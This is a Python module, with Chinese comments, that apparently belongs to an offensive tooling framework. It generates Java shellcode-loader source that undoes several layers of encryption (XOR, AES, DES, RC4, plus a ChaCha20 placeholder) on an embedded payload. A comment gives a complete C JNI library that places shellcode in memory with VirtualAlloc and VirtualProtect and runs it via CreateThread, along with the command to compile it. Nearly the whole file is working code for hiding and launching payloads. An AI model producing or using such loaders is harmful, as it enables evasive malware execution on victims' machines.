#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Java 解密加载器模块：单一职责 - 生成Java解密加载器代码（适配加密历史，自动解密）
"""
from core.encrypt.encrypt_manager import EncryptionHistory

class JavaDecryptLoader:
    """Java 解密加载器（适配加密历史，自动解密 Shellcode 后运行）"""
    @staticmethod
    def generate_decrypt(shellcode_len: int, encryption_history: EncryptionHistory) -> str:
        """生成 Java 解密加载器代码"""
        # 获取加密历史
        encrypt_history = encryption_history.get_full_history()
        
        # 生成解密逻辑
        decrypt_logic = ""
        decrypt_calls = ""
        
        for idx, encrypt_info in enumerate(reversed(encrypt_history), 1):
            alg = encrypt_info["alg"]
            params = encrypt_info["params"]
            
            if alg == "XOR":
                key_hex = params["key_hex"]
                key_bytes = [f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)]
                key_str = ", ".join(key_bytes)
                
                decrypt_logic += f"""
    // 第 {idx} 轮解密：XOR 解密
    private static void xorDecrypt{idx}(byte[] shellcode) {{
        byte[] key = new byte[] {{ {key_str} }};
        for (int i = 0; i < shellcode.length; i++) {{
            shellcode[i] ^= key[i % key.length];
        }}
    }}
"""
                
                decrypt_calls += f"        xorDecrypt{idx}(shellcode);\n"
            
            elif alg == "AES-256-CBC":
                key_hex = params["key_hex"]
                iv_hex = params["iv_hex"]
                key_bytes = [f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)]
                iv_bytes = [f"0x{iv_hex[i:i+2]}" for i in range(0, len(iv_hex), 2)]
                key_str = ", ".join(key_bytes)
                iv_str = ", ".join(iv_bytes)
                
                decrypt_logic += f"""
    // 第 {idx} 轮解密：AES-256-CBC 解密
    private static byte[] aesDecrypt{idx}(byte[] shellcode) {{
        try {{
            byte[] key = new byte[] {{ {key_str} }};
            byte[] iv = new byte[] {{ {iv_str} }};
            
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");
            javax.crypto.spec.SecretKeySpec keySpec = new javax.crypto.spec.SecretKeySpec(key, "AES");
            javax.crypto.spec.IvParameterSpec ivSpec = new javax.crypto.spec.IvParameterSpec(iv);
            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, keySpec, ivSpec);
            
            byte[] decrypted = cipher.doFinal(shellcode);
            return decrypted;
        }} catch (Exception e) {{
            System.err.println("AES-256-CBC解密失败: " + e.getMessage());
            return shellcode;
        }}
    }}
"""

                decrypt_calls += f"        shellcode = aesDecrypt{idx}(shellcode);\n"
            
            elif alg == "DES-CBC":
                key_hex = params["key_hex"]
                iv_hex = params["iv_hex"]
                key_bytes = [f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)]
                iv_bytes = [f"0x{iv_hex[i:i+2]}" for i in range(0, len(iv_hex), 2)]
                key_str = ", ".join(key_bytes)
                iv_str = ", ".join(iv_bytes)
                
                decrypt_logic += f"""
    // 第 {idx} 轮解密：DES-CBC 解密
    private static byte[] desDecrypt{idx}(byte[] shellcode) {{
        try {{
            byte[] key = new byte[] {{ {key_str} }};
            byte[] iv = new byte[] {{ {iv_str} }};
            
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("DES/CBC/PKCS5Padding");
            javax.crypto.spec.SecretKeySpec keySpec = new javax.crypto.spec.SecretKeySpec(key, "DES");
            javax.crypto.spec.IvParameterSpec ivSpec = new javax.crypto.spec.IvParameterSpec(iv);
            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, keySpec, ivSpec);
            
            byte[] decrypted = cipher.doFinal(shellcode);
            return decrypted;
        }} catch (Exception e) {{
            System.err.println("DES-CBC解密失败: " + e.getMessage());
            return shellcode;
        }}
    }}
"""

                decrypt_calls += f"        shellcode = desDecrypt{idx}(shellcode);\n"
            
            elif alg == "RC4":
                key_hex = params["key_hex"]
                key_bytes = [f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)]
                key_str = ", ".join(key_bytes)
                
                decrypt_logic += f"""
    // 第 {idx} 轮解密：RC4 解密
    private static void rc4Decrypt{idx}(byte[] shellcode) {{
        byte[] key = new byte[] {{ {key_str} }};
        
        // 初始化S盒
        byte[] sBox = new byte[256];
        for (int i = 0; i < 256; i++) {{
            sBox[i] = (byte) i;
        }}
        
        int j = 0;
        for (int i = 0; i < 256; i++) {{
            j = (j + sBox[i] + key[i % key.length]) % 256;
            byte temp = sBox[i];
            sBox[i] = sBox[j];
            sBox[j] = temp;
        }}
        
        // 解密过程
        int i = 0;
        j = 0;
        for (int k = 0; k < shellcode.length; k++) {{
            i = (i + 1) % 256;
            j = (j + sBox[i]) % 256;
            byte temp = sBox[i];
            sBox[i] = sBox[j];
            sBox[j] = temp;
            byte t = (byte) ((sBox[i] + sBox[j]) % 256);
            byte kValue = sBox[t];
            shellcode[k] ^= kValue;
        }}
    }}
"""
                
                decrypt_calls += f"        rc4Decrypt{idx}(shellcode);\n"
            
            elif alg == "ChaCha20":
                key_hex = params["key_hex"]
                nonce_hex = params["nonce_hex"]
                key_bytes = [f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)]
                nonce_bytes = [f"0x{nonce_hex[i:i+2]}" for i in range(0, len(nonce_hex), 2)]
                key_str = ", ".join(key_bytes)
                nonce_str = ", ".join(nonce_bytes)
                
                decrypt_logic += f"""
    // 第 {idx} 轮解密：ChaCha20 解密
    private static void chacha20Decrypt{idx}(byte[] shellcode) {{
        byte[] key = new byte[] {{ {key_str} }};
        byte[] nonce = new byte[] {{ {nonce_str} }};
        
        // 注意：ChaCha20 解密需要使用第三方库或自行实现
        // 这里提供一个简化的实现，实际使用中可能需要调整
        System.out.println("ChaCha20 decryption not implemented in this template. Please add ChaCha20 decryption logic.");
    }}
"""
                
                decrypt_calls += f"        chacha20Decrypt{idx}(shellcode);\n"
        
        # 生成完整的加载器代码
        loader_template = f"""
import java.io.IOException;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;

public class DecryptShellcodeLoader {{
    // 加载本地库
    static {{
        try {{
            // 注意：需要先编译并加载包含native方法实现的动态库
            System.loadLibrary("shellcodeexec");
        }} catch (UnsatisfiedLinkError e) {{
            System.err.println("Error loading native library: " + e.getMessage());
            System.err.println("Please compile and place the native library in the appropriate path.");
            System.exit(1);
        }}
    }}

    // Native方法声明
    private native boolean executeShellcode(byte[] shellcode);

    {decrypt_logic}

    public static void main(String[] args) {{
        try {{
            // 请将格式化后的加密 Shellcode 填入此处
            byte[] shellcode = new byte[{shellcode_len}];

            // 执行解密
            {decrypt_calls}

            DecryptShellcodeLoader loader = new DecryptShellcodeLoader();
            boolean result = loader.executeShellcode(shellcode);
            
            if (result) {{
                System.out.println("Shellcode executed successfully!");
            }} else {{
                System.out.println("Failed to execute shellcode.");
            }}
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
}}

/*
 * 对应的C/C++本地库代码（shellcodeexec.c）：
 * 
 * #include <jni.h>
 * #include <windows.h>
 * #include "DecryptShellcodeLoader.h"
 * 
 * JNIEXPORT jboolean JNICALL Java_DecryptShellcodeLoader_executeShellcode(JNIEnv *env, jobject obj, jbyteArray shellcodeArray) {{
 *     // 获取shellcode长度
 *     jsize shellcodeLen = (*env)->GetArrayLength(env, shellcodeArray);
 *     
 *     // 分配可读写内存
 *     LPVOID allocAddr = VirtualAlloc(NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 *     if (allocAddr == NULL) {{
 *         return JNI_FALSE;
 *     }}
 *     
 *     // 将shellcode复制到分配的内存
 *     (*env)->GetByteArrayRegion(env, shellcodeArray, 0, shellcodeLen, (jbyte*)allocAddr);
 *     
 *     // 修改内存属性为可执行
 *     DWORD oldProtect;
 *     if (!VirtualProtect(allocAddr, shellcodeLen, PAGE_EXECUTE_READ, &oldProtect)) {{
 *         VirtualFree(allocAddr, 0, MEM_RELEASE);
 *         return JNI_FALSE;
 *     }}
 *     
 *     // 创建并执行线程
 *     HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocAddr, NULL, 0, NULL);
 *     if (hThread == NULL) {{
 *         VirtualFree(allocAddr, 0, MEM_RELEASE);
 *         return JNI_FALSE;
 *     }}
 *     
 *     // 等待线程执行完成
 *     WaitForSingleObject(hThread, INFINITE);
 *     
 *     // 清理资源
 *     CloseHandle(hThread);
 *     VirtualFree(allocAddr, 0, MEM_RELEASE);
 *     
 *     return JNI_TRUE;
 * }}
 * 
 * 编译命令（Windows）：
 * cl /LD shellcodeexec.c /I"%JAVA_HOME%\include" /I"%JAVA_HOME%\include\win32"
 */
"""
        
        return loader_template.strip()
